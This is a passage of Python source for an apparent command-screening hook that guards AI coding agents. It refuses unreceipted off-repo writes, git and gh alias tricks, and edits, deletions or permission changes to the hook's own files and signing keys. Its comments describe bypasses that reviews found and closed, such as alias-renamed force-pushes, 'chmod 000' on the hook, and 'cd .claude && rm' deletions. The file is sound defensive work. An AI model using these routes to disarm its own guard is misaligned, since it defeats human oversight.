            # group exits with its status, as `( receipt )` does: the close keeps it armed. A
            # close after & or |, or after a later command, is not the receipt and arms nothing.
            continue
        armed = False
        for k, st in enumerate(stages):
            args, ws = st["args"], st["ws"]
            repeat = _repeats(args, ws)
            mine = token and k == 0 and not repeat
            body = _inner_body(ws) if depth < 3 else None
            runs = [(body, mine and not _is_deferred_def(ws))] if body is not None else []
            if depth < 3:
                for kind, prog, arm in st["feeds"]:
                    if kind == "interp":
                        runs += [(code, False) for code in _code_commands(prog)]
                    else:
                        runs.append((prog, token and arm and not repeat))
            for text, lead in runs:
                try:
                    if _unreceipted_scope(text, lead, depth + 1):
                        return True
                except ValueError:
                    if _GH_WORD.search(text) and not lead:
                        return True
            if runs:
                token = False   # what this stage runs took the receipt
                continue
            if _is_send(args):
                if not mine:
                    return True   # not &&-joined to a receipt, or a launcher may repeat it
                token = False   # one receipt covers exactly one send
    return False


def _unreceipted_scope(text, armed=False, depth=0, nest=0):
    """One receipt scope: the pipelines of text (the first armed by an incoming &&-receipt),
    then each command substitution body as its OWN unarmed scope -- a send inside $(...) runs
    during word expansion, so an outer receipt never arms it. Each body is read raw, with its
    own heredocs (substitution_bodies flat=False), so a heredoc inside $(...) is placed by the
    same reader as one on the surface (PR #648 review)."""
    if depth > 4:
        return False
    raws, surface, _patch, docs = substitution_bodies(text, 1 if nest else 0, flat=False)
    if _unreceipted_flow(_flow(surface, docs), armed, depth):
        return True
    if nest >= 4:   # past the depth substitutions are read to: a gh word there refuses
        return any(_GH_WORD.search(raw) for raw in raws)
    return any(_unreceipted_scope(raw, False, depth, nest + 1) for raw in raws)


if _unreceipted_scope(raw_command):
    record("E", "unreceipted")


def _alias_refusal(ws):
    # D: a refusal with a reason of its own (#598). A gh alias whose expansion is an off-repo
    # write runs that write later, from a command naming no gh verb, with no receipt to bind it
    # to; an imported alias file holds expansions this hook never sees.
    if not ws or ws[0].rsplit("/", 1)[-1] != "gh":
        return None
    alias = _gh_alias(ws)
    if not alias:
        return None
    if alias[0] == "import":
        return ("gh alias import loads alias expansions this hook cannot read; define each "
                "alias with gh alias set so its expansion is judged.")
    if alias[0] == "set":
        # A shell alias (! or --shell) expands to a command line; a plain alias to gh ARGS.
        body = alias[2] if alias[3] else "gh " + alias[2]
        try:
            unreceipted = _unreceipted_scope(body)
        except ValueError:
            unreceipted = _is_send(body.split())
        # The saved action is deferred, so an outer receipt cannot arm it: a send inside with
        # no receipt INSIDE the expansion is refused outright (PR #648 review).
        if unreceipted:
            return ("a gh alias whose expansion is an off-repo write runs it later; an outer "
                    "egress receipt cannot cover a deferred send (rule 5). Put the receipt "
                    "inside the alias, or run the write itself, receipted.")
    return None


_GIT_CONFIG_READS = ("--get", "--get-all", "--get-regexp", "--get-urlmatch", "-l", "--list",
                     "--unset", "--unset-all", "--remove-section", "--rename-section", "-e",
                     "--edit", "--show-origin", "--show-scope", "--name-only", "--get-colorbool")
_GIT_CONFIG_OPERAND = ("-f", "--file", "--blob", "--default", "--type")


def _git_alias_laundering(assigns, ws):
    # D (2026-10-26 review): `git -c alias.p=push p --force origin main` runs `git push`, yet once
    # the -c operand is stripped the subcommand this hook and the HIGH tier read is `p`, so the
    # force-push was ALLOWED. An alias defined in the same command -- -c, --config-env, a
    # GIT_CONFIG_* assignment, or `git config alias.X Y` -- renames a verb every rule here judges
    # by name, and a worker has no use for one: the definition itself is refused.
    if not ws or ws[0].rsplit("/", 1)[-1] != "git":
        return None
    keys = []
    for a in assigns or []:
        name, _eq, value = a.partition("=")
        if name == "GIT_CONFIG_PARAMETERS" or re.fullmatch(r"GIT_CONFIG_KEY_[0-9]+", name):
            keys.append(value)
    rest, i = ws[1:], 0
    while i < len(rest) and rest[i].startswith("-") and rest[i] != "-":
        w = rest[i]
        if w in ("-c", "--config-env") and i + 1 < len(rest):
            keys.append(rest[i + 1])
        elif w.startswith("--config-env="):
            keys.append(w.split("=", 1)[1])
        i += 2 if w in _GIT_GLOBAL_ARG else 1
    if any("alias." in k.lower() for k in keys):
        return ("a git alias defined in the command itself (-c alias.*, --config-env=alias.*, "
                "GIT_CONFIG_*) renames the subcommand this hook judges by name; run the real "
                "subcommand instead.")
    sub = rest[i:]
    if sub[:1] != ["config"]:
        return None
    operands, j = [], 1
    while j < len(sub):
        w = sub[j]
        if w in _GIT_CONFIG_READS:
            return None
        if w in _GIT_CONFIG_OPERAND:
            j += 2
            continue
        if not w.startswith("-") or w == "-":
            operands.append(w)
        j += 1
    if len(operands) >= 2 and operands[0].lower().startswith("alias."):
        return ("git config alias.* defines an alias that a later command runs under another "
                "name, past every rule here; run the real subcommand instead.")
    return None


# --- self-guard (#577): a worker must not be able to disarm its own hook --------------
# Hook configs inside the unit worktree, and this file wherever it is. Matched on the
# path as written AND as resolved, so a relative target needs no cwd to be judged.
# The pinned trust anchors are guarded the same way (#598, from #602): decisions.py and
# floor_guard.py verify one-way grants against .orca/human-grant-pubkey, and verify-gate.sh and
# run_report.py verify dispatch records against .orca/dispatch-pubkey. A worker that rewrites
# either key signs its own grants. Reading them stays free; the rest of .orca/ is not guarded.
_GUARD_FILES = (r"\.claude/settings[^/]*\.json|\.codex/hooks\.json|\.openhands/hooks\.json"
                r"|\.agents/plugins/orca-deny-hook(/.*)?|\.opencode/plugins?/orca-deny-hook\.ts"
                r"|\.crush/crush\.json|\.crush-orca-ro(/.*)?|\.hermes-open-fleet(/.*)?"
                r"|\.orca/human-grant-pubkey|\.orca/dispatch-pubkey")
_GUARD_DIRS = r"\.claude|\.codex|\.openhands|\.agents|\.agents/plugins|\.opencode|\.opencode/plugins?|\.crush"
# Inside the worktree all of .open-fleet/ is the guard; OUTSIDE it only its hooks and
# bridges are, because the fleet state dir (~/.open-fleet/state/...) holds the worktrees.
GUARD_IN = re.compile(r"^(" + _GUARD_FILES + r"|\.open-fleet(/.*)?|" + _GUARD_DIRS + r")/?$")
GUARD_ANY = re.compile(r"(^|/)(" + _GUARD_FILES + r"|\.open-fleet/(hooks|bridges)(/.*)?|"
                       + _GUARD_DIRS + r")/?$")
GUARD_REL = re.compile(r"(^|/)(" + _GUARD_FILES + r"|\.open-fleet(/.*)?|" + _GUARD_DIRS + r")/?$")
GUARD_SAMPLES = (".claude/settings.json", ".claude/settings.local.json", ".codex/hooks.json",
                 ".openhands/hooks.json", ".agents/plugins/orca-deny-hook/hooks/hooks.json",
                 ".opencode/plugin/orca-deny-hook.ts", ".open-fleet/hooks/deny-hook.sh",
                 ".open-fleet/bridges/omp_pi_deny_bridge.ts", ".crush/crush.json",
                 ".crush-orca-ro/crush.json", ".hermes-open-fleet/config.yaml",
                 ".orca/human-grant-pubkey", ".orca/dispatch-pubkey")
# The directory holding each guard file, relative to the worktree root. An extraction or patch
# whose destination equals, contains or sits inside any of these can write a guard file with an
# ordinary member name, so the destination check (W1-05, Codex g1 r2 P1) covers all three.
_GUARD_DIRS_REL = sorted({os.path.dirname(_s) for _s in GUARD_SAMPLES if os.path.dirname(_s)})
_GW = os.environ.get("OPEN_FLEET_UNIT_WORKTREE") or os.environ.get("ORCA_UNIT_WORKTREE") or ""
_GROOT = os.path.realpath(_GW) if _GW else os.path.realpath(os.getcwd())
_GSELF = {os.path.realpath(_p) for _p in (os.environ.get("DH_SELF"),
                                          os.environ.get("OPEN_FLEET_DENY_HOOK"),
                                          os.environ.get("ORCA_DENY_HOOK_PATH")) if _p}


def _glob_segments(op_segs, sample_segs, prefix_ok):
    # Shell glob per path segment: * never crosses a slash and never matches a leading dot.
    if len(op_segs) > len(sample_segs) or (not prefix_ok and len(op_segs) != len(sample_segs)):
        return False
    for o, g in zip(op_segs, sample_segs):
        if g.startswith(".") and not o.startswith("."):
            return False
        if not fnmatch.fnmatchcase(g, o):
            return False
    return True


_GUARD_SEG_CANON = {seg.lower(): seg for g in GUARD_SAMPLES for seg in g.split("/")}


def _fold_guard_case(p):
    # Git matches pathspecs case-insensitively under --icase-pathspecs / GIT_ICASE_PATHSPECS,
    # and so does a case-insensitive filesystem (macOS default): there `.CLAUDE` IS `.claude`
    # (#592 review). Fold every guard-named segment to its canonical spelling.
    return "/".join(_GUARD_SEG_CANON.get(seg.lower(), seg) for seg in p.split("/"))


def guarded(p, deleting, base=None):
    if not p:
        return False
    folded = _fold_guard_case(p)
    if folded != p and _guarded_exact(folded, deleting, base):
        return True
    return _guarded_exact(p, deleting, base)


def _guarded_exact(p, deleting, base=None):
    if not p:
        return False
    norm = os.path.normpath(os.path.expanduser(p))
    absn = norm if norm.startswith("/") else os.path.normpath(os.path.join(base or os.getcwd(), norm))
    try:
        real = os.path.realpath(absn)
    except (OSError, ValueError):
        real = absn
    for cand in (absn, real):
        if cand == _GROOT or cand.startswith(_GROOT.rstrip("/") + "/"):
            rel = os.path.relpath(cand, _GROOT)
            rel = "" if rel == "." else rel
            if GUARD_IN.search(rel):
                return True
            segs = [x for x in rel.split("/") if x]
            if deleting or any(ch in rel for ch in "*?["):
                if any(_glob_segments(segs, g.split("/"), deleting) for g in GUARD_SAMPLES):
                    return True
        elif GUARD_ANY.search(cand) or (deleting and re.search(r"(^|/)\.orca/?$", cand)):
            return True   # outside the unit too: deleting an .orca dir deletes its anchors
    if not norm.startswith("/") and GUARD_REL.search(norm):
        return True
    for me in _GSELF:
        if real == me or (deleting and me.startswith(real.rstrip("/") + "/")):
            return True
    # Deleting the unit worktree, or a directory holding it, deletes the guard with it.
    return bool(deleting and _GW and (_GROOT == real or _GROOT.startswith(real.rstrip("/") + "/")))


def _operands(rest, opt_arg=()):
    out, i, end = [], 0, False
    while i < len(rest):
        w = rest[i]
        if not end and w == "--":
            end = True
        elif not end and w.startswith("-") and w != "-":
            if w in opt_arg:
                i += 1
        else:
            out.append(w)
        i += 1
    return out


_GIT_GLOBAL_ARG = ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix",
                   "--config-env", "--list-cmds", "--exec-path")


def _git_sub(rest):
    """The git subcommand and its words, past git global options and their operands."""
    i = 0
    while i < len(rest) and rest[i].startswith("-") and rest[i] != "-":
        i += 2 if rest[i] in _GIT_GLOBAL_ARG else 1
    return rest[i:]


def _long_is(word, names):
    name = word[2:].split("=", 1)[0]
    return bool(name) and not name.startswith("no-") and any(n.startswith(name) for n in names)


def _git_clean_takes_ignored(rest):
    # -x / -X anywhere in a short cluster (an -e cluster consumes the rest as its pattern);
    # only a dry run (-n / --dry-run) is harmless.
    ignored = dry = False
    i = 0
    while i < len(rest):
        w = rest[i]
        if w == "--":
            break
        if w.startswith("--"):
            dry = dry or _long_is(w, ("dry-run",))
            if w in ("--exclude",):
                i += 1
        elif w.startswith("-") and len(w) > 1:
            for j, ch in enumerate(w[1:]):
                if ch == "e":
                    if j == len(w) - 2:
                        i += 1
                    break
                ignored = ignored or ch in "xX"
                dry = dry or ch == "n"
        i += 1
    return ignored and not dry


def _git_clean_pathspecs(rest):
    """Pathspecs a `git clean` is limited to ([] = the whole tree from cwd)."""
    specs, i, end = [], 0, False
    while i < len(rest):
        w = rest[i]
        if not end and w == "--":
            end = True
        elif not end and w.startswith("--"):
            if w == "--exclude":
                i += 1
        elif not end and w.startswith("-") and len(w) > 1:
            for j, ch in enumerate(w[1:]):
                if ch == "e":
                    if j == len(w) - 2:
                        i += 1
                    break
        else:
            specs.append(w)
        i += 1
    return specs


def _git_stash_takes_untracked(rest):
    ws = list(rest)
    if ws and ws[0] in ("push", "save"):
        ws = ws[1:]
    elif ws and not ws[0].startswith("-"):
        return False  # list/show/pop/apply/drop/... take no -u/-a
    i = 0
    while i < len(ws):
        w = ws[i]
        if w == "--":
            break
        if w.startswith("--"):
            if _long_is(w, ("all", "include-untracked")):
                return True
            if w in ("--message", "--pathspec-from-file"):
                i += 1
        elif w.startswith("-") and len(w) > 1:
            for j, ch in enumerate(w[1:]):
                if ch == "m":
                    if j == len(w) - 2:
                        i += 1
                    break
                if ch in "ua":
                    return True
        i += 1
    return False


def _cd_target(words):
    """The directory a `cd`/`pushd` segment moves to: a path, "?" when text cannot tell, else None."""
    ws = _command_words(words)
    if not ws or ws[0] not in ("cd", "pushd"):
        return None
    ops = [w for w in ws[1:] if not (w.startswith("-") and w != "-")]
    target = ops[0] if ops else "~"
    if target == "-" or any(ch in target for ch in "$`*?["):
        return "?"
    return target


_GUARD_BASENAMES = {g.rsplit("/", 1)[-1] for g in GUARD_SAMPLES} - {"config.yaml"}
# A purely additive symbolic chmod mode (u+x, +w, a+rX) takes no permission away.
_CHMOD_ADDITIVE = re.compile(r"[ugoa]*\+[rwxXst]*(,[ugoa]*\+[rwxXst]*)*")
# Option words of rsync that take a separate operand.
_RSYNC_ARG = ("-e", "--rsh", "-f", "--filter", "--exclude", "--include", "--exclude-from",
              "--include-from", "--files-from", "-T", "--temp-dir", "-B", "--block-size", "-M",
              "--remote-option", "--log-file", "--out-format", "--partial-dir", "--backup-dir",
              "--suffix", "--compare-dest", "--copy-dest", "--link-dest", "--chmod", "--chown",
              "--password-file", "--port", "--timeout", "--bwlimit", "--max-size", "--min-size",
              "--rsync-path", "--address", "-@", "--modify-window", "--info", "--debug")
# curl/wget short options that take an operand (the rest of the cluster, else the next word).
_FETCH_ARG = {"curl": "oKdHuXAebcFTwxrmyYzCEPQtUD", "wget": "OoaiPtTwQUeBlARDXI"}


def _attr_targets(head, rest):
    """The files a chmod/chown/chgrp changes (none for an additive chmod mode)."""
    ops, end, ref = [], False, False
    for w in rest:
        if not end and w == "--":
            end = True
        elif not end and w.startswith("--reference"):
            ref = True
        elif not end and w.startswith("-") and len(w) > 1 \
                and not (head == "chmod" and re.fullmatch(r"-[rwxXst]+", w)):
            continue  # an option; chmod -x / -w are MODES, not options
        else:
            ops.append(w)
    if ref:
        return ops
    if not ops or (head == "chmod" and _CHMOD_ADDITIVE.fullmatch(ops[0])):
        return []
    return ops[1:]


def _sort_outputs(rest):
    """The -o/--output files a sort writes."""
    out, i = [], 0
    while i < len(rest):
        w = rest[i]
        if w == "--":
            break
        if w.startswith("--"):
            name, eq, val = w[2:].partition("=")
            if name and "output".startswith(name):
                if not eq and i + 1 < len(rest):
                    val, i = rest[i + 1], i + 1
                out.append(val)
            elif not eq and name in ("key", "field-separator", "buffer-size", "temporary-directory",
                                     "files0-from", "batch-size", "parallel", "compress-program",
                                     "random-source", "sort"):
                i += 1
        elif w.startswith("-") and len(w) > 1:
            for k, flag in enumerate(w[1:]):
                if flag in "okStT":
                    val = w[k + 2:]
                    if not val and i + 1 < len(rest):
                        val, i = rest[i + 1], i + 1
                    if flag == "o":
                        out.append(val)
                    break
        i += 1
    return out


def _editor_targets(head, rest):
    """The files ed/ex/vi open, and so may write; vim -w/-W write their keystroke log too."""
    if head in ("ed", "red"):
        return _operands(rest, ("-p",))
    skip = ("-c", "--cmd", "-S", "-u", "-U", "-i", "-s", "-T", "-t", "-q", "-w", "-W")
    out = [w for w in _operands(rest, skip) if not w.startswith("+")]
    return out + [rest[i + 1] for i, w in enumerate(rest[:-1]) if w in ("-w", "-W")]


def _fetch_outputs(head, rest):
    """The files a curl/wget writes: -o / -O / --output(-document), or the URL basename."""
    arg, out_flag = _FETCH_ARG[head], "o" if head == "curl" else "O"
    longs = ("--output",) if head == "curl" else ("--output-document",)
    outs, remote, explicit, i = [], False, False, 0
    while i < len(rest):
        w = rest[i]
        if w.startswith("--"):
            name, eq, val = w.partition("=")
            if name in longs:
                if not eq and i + 1 < len(rest):
                    val, i = rest[i + 1], i + 1
                outs.append(val)
                explicit = True
            elif name in ("--remote-name", "--remote-name-all"):
                remote = True
        elif w.startswith("-") and len(w) > 1:
            for k, flag in enumerate(w[1:]):
                if head == "curl" and flag == "O":
                    remote = True
                elif flag in arg:
                    val = w[k + 2:]
                    if not val and i + 1 < len(rest):
                        val, i = rest[i + 1], i + 1
                    if flag == out_flag:
                        outs.append(val)
                        explicit = True
                    break
        i += 1
    if remote or (head == "wget" and not explicit):
        outs += [re.sub(r"[?#].*", "", u).rstrip("/").rsplit("/", 1)[-1]
                 for u in rest if re.match(r"[A-Za-z][A-Za-z0-9+.-]*://", u)]
    return [o for o in outs if o and o != "-"]


_FIND_NAME_TESTS = ("-name", "-iname", "-path", "-ipath", "-wholename", "-iwholename")
# Tokens after which a chain of tests can no longer be read as a plain conjunction.
_FIND_UNPROVABLE = ("!", "-not", "-o", "-or", ",", "(", ")", "-regex", "-iregex")


def _find_split(rest):
    """(starting points, expression) of a find command, past -H/-L/-P/-D/-O options."""
    i = 0
    while i < len(rest) and rest[i] in ("-H", "-L", "-P") or (i < len(rest) and rest[i][:2] in ("-D", "-O")):
        i += 2 if rest[i] == "-D" else 1
    roots = []
    while i < len(rest) and not rest[i].startswith(("-", "(", "!", ")", ",")):
        roots.append(rest[i])
        i += 1
    return roots, rest[i:]


def _find_spots(root):
    """(path as find prints it, basename) of every known guard file under one starting point."""
    rabs = os.path.normpath(os.path.join(os.getcwd(), os.path.expanduser(root)))
    out = []
    for g in tuple(GUARD_SAMPLES) + tuple(_GSELF):
        gabs = os.path.normpath(os.path.join(_GROOT, g))
        if gabs == rabs or gabs.startswith(rabs.rstrip("/") + "/"):
            rel = os.path.relpath(gabs, rabs)
            shown = root if rel == "." else (root.rstrip("/") or "") + "/" + rel
            out.append((shown, os.path.basename(gabs)))
    return out


def _find_may_match(tests, shown, name):
    """False only when one test of a plain AND-chain cannot match this path."""
    if any(t in _FIND_UNPROVABLE for t in tests):
        return True
    i = 0
    while i < len(tests):
        t = tests[i]
        if t in _FIND_NAME_TESTS and i + 1 < len(tests):
            subject, pat = (name if t in ("-name", "-iname") else shown), tests[i + 1]
            if t[1] == "i":
                subject, pat = subject.lower(), pat.lower()
            if not fnmatch.fnmatchcase(subject, pat):
                return False
            i += 2
            continue
        i += 1
    return True


_TAR_TAKES = set("fCbLVXTIgG")   # tar option letters that consume an operand


def _tar_info(rest):
    """(letters, long-names, -f file target, -C destination) for a tar command, reading BOTH the
    dashed form and tar traditional dashless bundle -- `tar cf FILE src` / `tar xf e.tar`, where
    the first operand is the option bundle and its arg-taking letters consume the operands that
    follow, in order (Codex g1 P1, W1-05)."""
    letters, longs, pos, pending, dashed = "", [], [], [], {}
    i = 0
    while i < len(rest):
        w = rest[i]
        if w == "--":
            pos.extend(rest[i + 1:])
            break
        if w.startswith("--"):
            name, eq, val = w[2:].partition("=")
            longs.append(name)
            if name in ("file", "directory"):
                if eq:
                    dashed[name] = val
                elif i + 1 < len(rest):
                    dashed[name] = rest[i + 1]
                    i += 1
            i += 1
            continue
        if w.startswith("-") and len(w) > 1:
            cluster = w[1:]
            letters += cluster
            k = next((k for k, c in enumerate(cluster) if c in _TAR_TAKES), None)
            if k is not None:
                glued = cluster[k + 1:]
                if glued:
                    dashed[cluster[k]] = glued
                elif i + 1 < len(rest):
                    dashed[cluster[k]] = rest[i + 1]
                    i += 1
            i += 1
            continue
        if not letters and not pos and re.fullmatch(r"[A-Za-z]+", w):
            letters += w                       # the traditional dashless bundle
            pending = [c for c in w if c in _TAR_TAKES]
            i += 1
            continue
        pos.append(w)
        i += 1
    trad = dict(zip(pending, pos))
    file_t = dashed.get("f") or dashed.get("file") or trad.get("f")
    dest = dashed.get("C") or dashed.get("directory") or trad.get("C")
    return letters, longs, file_t, dest


def guard_targets(words, depth=0):
    """(path, deleting) pairs a shell command writes or removes, as far as text shows.

    deleting also marks a change to a path AS A WHOLE (a mode, an owner, a contents sync):
    done to a directory above the hook, it reaches the hook too.
    """
    ws = _command_words(words)
    if not ws:
        return []
    head, rest, out = ws[0].rsplit("/", 1)[-1], ws[1:], []
    head, rest = _peel_busybox(head, rest)   # busybox tar -> tar, so an applet is judged (W1-05)
    if head in ("bsdtar", "gtar"):
        head = "tar"                          # same create/extract flags (Codex g1 r2 P1)
    if head == "tar":
        # A create/append/update with -f FILE overwrites FILE: `tar -cf .claude/settings.json x`
        # (or `tar cf …`, the dashless bundle) replaces the guard with a tarball (W1-05).
        # Extraction is handled in the never list, since the member names are not visible here.
        letters, longs, fval, _dest = _tar_info(rest)
        if any(c in letters for c in "cru") or any(x in longs for x in ("create", "append",
                                                                        "update")):
            if fval and fval != "-":
                out.append((fval, True))
    elif head == "patch":
        for i, w in enumerate(rest):
            if w in ("-o", "--output") and i + 1 < len(rest):
                out.append((rest[i + 1], False))
            elif w.startswith("--output="):
                out.append((w.split("=", 1)[1], False))
    if head == "find":
        # find ROOT... -delete, or -exec CMD {} (#598, PR #648 review): each guard file under a
        # starting point is deleted unless the AND-chain of tests before the action PROVES it
        # unmatched. A negation, -o, a group or -regex proves nothing; -iname/-ipath compare
        # case-insensitively; -path is matched against the path as find prints it, absolute
        # roots included. A -exec command is judged once per guard file it may receive as {}.
        roots, expr = _find_split(rest)
        for k, word in enumerate(expr):
            if word not in ("-delete", "-exec", "-execdir", "-ok", "-okdir"):
                continue
            for root in roots or ["."]:
                spots = _find_spots(root)
                hits = [shown for shown, name in spots if _find_may_match(expr[:k], shown, name)]
                if not spots and guarded(root, True):
                    hits = [root]   # a guard this hook cannot enumerate: judge the root itself
                if word == "-delete":
                    out += [(shown, True) for shown in hits]
                    continue
                end = next((j for j in range(k + 1, len(expr)) if expr[j] in (";", "+")), len(expr))
                for shown in hits:
                    cmd = [w.replace("{}", shown) for w in expr[k + 1:end]]
                    out += guard_targets(cmd, depth + 1) if depth < 3 else []
    if head == "git":
        sub = _git_sub(rest)
        if sub and sub[0] in ("rm", "mv"):
            head, rest = sub[0], sub[1:]
        elif sub and sub[0] == "clean" and _git_clean_takes_ignored(sub[1:]):
            # The hook configs are listed in info/exclude, so -x/-X deletes them (#592) --
            # unless pathspecs keep the clean away from them (`git clean -fdx -- build/`).
            # Git pathspec globs cross "/" and ":(magic)" changes matching, so either one
            # is judged as the whole tree.
            specs = _git_clean_pathspecs(sub[1:])
            if specs and not any(any(ch in sp for ch in "*?[") or sp.startswith(":") for sp in specs):
                return [(sp, True) for sp in specs]
            return [(g, True) for g in GUARD_SAMPLES]
        elif sub and sub[0] == "stash" and _GW and _git_stash_takes_untracked(sub[1:]):
            # -u/-a stash and then REMOVE untracked (and, with -a, ignored) files.
            return [(g, True) for g in GUARD_SAMPLES]
    if head in ("rm", "rmdir", "unlink", "shred"):
        out += [(w, True) for w in _operands(rest, ("-n", "--iterations", "-s", "--size"))]
    elif head in ("mv", "cp", "ln", "install"):
        tdir = None
        for i, w in enumerate(rest):
            if w in ("-t", "--target-directory") and i + 1 < len(rest):
                tdir = rest[i + 1]
            elif w.startswith("--target-directory="):
                tdir = w.split("=", 1)[1]
            elif re.fullmatch(r"-[A-Za-z]*t", w) and i + 1 < len(rest):
                tdir = rest[i + 1]  # -rt DIR: the cluster ends in the operand-taking -t
            elif re.fullmatch(r"-[A-Za-z]*?t[^A-Za-z].*", w):
                tdir = w[w.index("t") + 1:]  # -t/dir glued
        ops = _operands(rest, ("-t", "--target-directory", "-S", "--suffix", "-m", "--mode",
                               "-o", "--owner", "-g", "--group"))
        dests, srcs = ([tdir], ops) if tdir is not None else ((ops[-1:], ops[:-1]) if ops else ([], []))
        # -T, or a src/. contents copy, replaces what is in the destination wholesale.
        whole = any(w == "--no-target-directory" or re.fullmatch(r"-[A-Za-z]*T[A-Za-z]*", w)
                    for w in rest) or any(s_.endswith("/.") for s_ in srcs)
        out += [(d_, whole) for d_ in dests]
        out += [(d_.rstrip("/") + "/" + os.path.basename(s_.rstrip("/")), False)
                for d_ in dests for s_ in srcs]
        if head == "mv":
            out += [(s_, True) for s_ in srcs]
    elif head in ("sed", "perl"):
        if any(w == "--in-place" or w.startswith("--in-place=")
               or re.fullmatch(r"-[A-Za-z]*i\S*", w) for w in rest):
            skip = ("-e", "-f", "--expression", "--file", "-l") if head == "sed" else ("-e", "-E", "-M", "-I")
            out += [(w, False) for w in _operands(rest, skip)]
    elif head == "truncate":
        out += [(w, False) for w in _operands(rest, ("-s", "--size", "-r", "--reference"))]
    elif head == "tee":
        out += [(w, False) for w in _operands(rest)]
    elif head == "dd":
        out += [(w[3:], False) for w in rest if w.startswith("of=")]
    # chmod 000 / chmod -x / sort -o on the hook were allowed while truncate and rm were
    # denied; after chmod 000 the hosts that fail open on a hook error run unguarded
    # (2026-10-23 review, P1-4). touch is left out: it changes no content or permission.
    elif head in ("chmod", "chown", "chgrp"):
        out += [(w, True) for w in _attr_targets(head, rest)]
    elif head == "sort":
        out += [(w, False) for w in _sort_outputs(rest)]
    elif head in ("ed", "red", "ex", "vi", "vim", "nvim"):
        out += [(w, False) for w in _editor_targets(head, rest)]
    elif head == "rsync":
        ops = _operands(rest, _RSYNC_ARG)
        if len(ops) > 1:
            dest, srcs = ops[-1], ops[:-1]
            whole = any(w.startswith("--del") for w in rest) \
                or any(s_.endswith(("/", "/.")) for s_ in srcs)
            out += [(dest, whole)]
            out += [(dest.rstrip("/") + "/" + os.path.basename(s_.rstrip("/")), False) for s_ in srcs]
            if "--remove-source-files" in rest:
                out += [(s_, True) for s_ in srcs]
    elif head in _FETCH_ARG:
        out += [(w, False) for w in _fetch_outputs(head, rest)]
    elif depth < 3 and _inner_body(ws) is not None:
        inner = _inner_body(ws)
        if inner:
            try:
                for _j, seg2 in _split(inner):
                    a2, w2 = _tokenize(seg2)
                    out += [(w, False) for w in w2]
                    out += guard_targets(a2, depth + 1)
            except ValueError:
                pass  # an inner string the tokenizer cannot read is judged as written
    # Interpreter code that names a guard path beside a write-shaped call -- open with a write
    # mode, os.chmod, unlink, a shell-out -- is judged a write to that path (P1-4), whether it
    # comes from argv (python -c) or is fed on stdin or a heredoc (PR #648 review ...ZVy).
    for code in _inline_code(head, rest):
        out += _code_guard_targets(code, depth)
    return out


def _code_guard_targets(code, depth=0):
    out = []
    if not _CODE_WRITES.search(code):
        return out
    for m in _CODE_LITERAL.finditer(code):
        lit = m[1] if m[1] is not None else m[2]
        out.append((lit, False))
        if depth < 3 and " " in lit.strip():
            try:
                for _j, seg2 in _split(lit):
                    out += guard_targets(_tokenize(seg2)[0], depth + 1)
            except ValueError:
                out += [(w, False) for w in lit.split()]
    return out


# W: the write targets the boundary judges, in the path model of the shell: every redirect target
# and every tee operand, a leading ~/$HOME expanded QUOTE-AWARE (W1-01; Codex g1 P2 -- a quoted
# ~ is left literal, as bash does). Read off the segment text so the raw (pre-unquote) word is
# available to decide the expansion.
# Every body segment is read too, at every depth (2026-10-29 audit, F1): sh -c, bash -lc,
# find -exec sh -c, xargs sh -c, flock ... sh -c, sed e and the shell line awk system() or perl
# system() hands over all write through their own redirects, which only the top level fed this.
for _wj, _wseg in _split(_judged):
    for _wu, _wraw in _write_targets(_wseg):
        record("W", _sh_home_path(_wu, _wraw))
for _wseg in dict.fromkeys(_body_texts):
    try:
        _btargets = _coarse_writes(_wseg[1:]) if _wseg.startswith(_UNSPLIT) else _write_targets(_wseg)
    except ValueError:
        _btargets = _coarse_writes(_wseg)
    for _wu, _wraw in _btargets:
        record("W", _sh_home_path(_wu, _wraw))


_guard_hits = []
if norm_tool in ("Edit", "Write", "MultiEdit", "NotebookEdit"):
    _guard_hits += [p for p in target_paths if guarded(p, False)]
_guard_hits += [p for p in heredoc_targets if guarded(p, False)]
# An interpreter fed a guard-path write on stdin or a heredoc, not only via -c (review ...ZVy).
for _code in dict.fromkeys(_FED_INTERP):
    _guard_hits += [p for p, deleting in _code_guard_targets(_code) if guarded(p, deleting)]
# A `cd` earlier in the line moves every later relative target: `cd .claude && rm
# settings.local.json` deletes the guard although neither word names it (#592). A cd the
# text cannot resolve ($VAR, -, a glob) leaves only the basename to judge by.
_vcwd, _vlost = os.getcwd(), False
for _args, _writes in _guard_segs:
    _cd = _cd_target(_args)
    if _cd == "?":
        _vlost = True
    elif _cd is not None:
        _vcwd = os.path.normpath(os.path.join(_vcwd, os.path.expanduser(_cd)))
    _targets = [(w, False) for w in _writes] + guard_targets(_args)
    _guard_hits += [p for p, deleting in _targets
                    if guarded(p, deleting) or guarded(p, deleting, _vcwd)
                    or (_vlost and not p.startswith(("/", "~"))
                        and os.path.basename(p.rstrip("/")) in _GUARD_BASENAMES)]
if _guard_hits:
    record("G", s(_guard_hits[0]))
if strict_payload:
    record("S", "1")
for _hp in heredoc_targets:
    record("P", s(_home_path(_hp)))


# --- Never list, the shapes a regex over the line cannot read (2026-10-23 review) ----------
# N records: the shell asks on the first one. Judged on the peeled words of every command.
_WHOLE_TREE = (".", "./", "./*", "*", ":/", ":/*", ":(top)", ":(top).")


def _dest_covers_guard(dest):
    """True when an extraction into dest could write a guard path (W1-05, Codex g1 r2 P1). The
    guard files sit at known directories under the worktree root, so a destination that EQUALS,
    CONTAINS or sits INSIDE any guard directory reaches a guard file with an ordinary member
    name -- `tar -C .claude -xf e.tar` drops `settings.json` straight onto the guard, which the
    old contain-the-root test missed. An unknown destination (no -C/-d; the worker cwd
    this hook is not told) is assumed to be the root. A RELATIVE destination is resolved against
    the root and its symlinks followed; an unresolvable one asks rather than allows.
    The guard directories are resolved too, WHEREVER they land (Codex g1 r3 P1): with `.claude`
    a symlink to /tmp/shared-claude, `tar -C /tmp/shared-claude -xf e.tar` replaces the guard
    settings.json although the destination is outside the worktree, so the destination is
    compared with every guard directory and the directory of every guard file (this hook
    included), lexical and resolved, never only with the part of them under the root."""
    if dest is None:
        return True
    d = _home_path(dest)
    if d in (".", "./") or ".." in d.split("/"):
        return True
    base = d if d.startswith("/") else os.path.join(_GROOT, d)
    try:
        real = os.path.realpath(base).rstrip("/") or "/"
        guard_dirs = _guard_dirs_resolved()
    except (OSError, ValueError):
        return True   # cannot resolve -> ask, never a silent allow
    root = _GROOT.rstrip("/") or "/"
    if _within(root, real):
        return True   # the root itself, or any directory above it (/ included)
    for gd in guard_dirs:
        if _within(real, gd) or _within(gd, real):
